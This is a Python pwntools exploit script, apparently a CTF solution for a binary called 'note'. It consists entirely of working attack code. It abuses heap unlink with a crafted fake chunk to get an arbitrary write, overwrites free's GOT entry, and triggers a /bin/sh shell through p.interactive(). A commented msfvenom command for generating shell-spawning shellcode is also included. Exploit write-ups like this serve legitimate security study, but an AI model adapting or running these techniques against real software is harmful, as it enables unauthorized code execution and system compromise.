#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-09 08:34:41
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
# import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./note"
remote_ip = ""
port = 0
# rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def add(length,data):
	ru("6. Exit")
	sl("1")
	# raw_input()
	ru("\n")
	sl(str(length))
	ru("\n")
	sl(data)
def dele(index):
	ru("6. Exit")
	sl("2")
	ru("the id:")
	sl(str(index))
def edit(index,data):
	ru("6. Exit")
	sl("5")
	ru("\n")
	sl(str(index))
	ru("\n")
	sl(data)
def edit_anyaddr(addr,data):
	edit(1,p32(0)+p32(addr))
	edit(0,data)
	
# stage 1 unlink
add(0,"a"*0x8)#0
add(0x100,"aaa")#1  >=0x200会使用large chunk
add(0x100,"aaa")#2
add(0x100,"/bin/sh\x00")#3
junk = "\x00"*8
head = p32(0)*2
fake_head = p32(0)+p32(0x101)
fd = p32(0x1205C+0x8-0xc)
bk = p32(0x1205C+0x8-0x8)
payload  = junk+head
payload += fake_head+fd+bk
payload += "a"*(0x100-len(fake_head+fd+bk))
payload += p32(0x100)+p32(0x108)
edit(0,payload)
raw_input()
dele(2)

# stage 2 edit free_got
edit_anyaddr(0x12024,p32(0x8538)[:-1])#有零字节溢出，会破坏下一个got
dele(3)
p.interactive()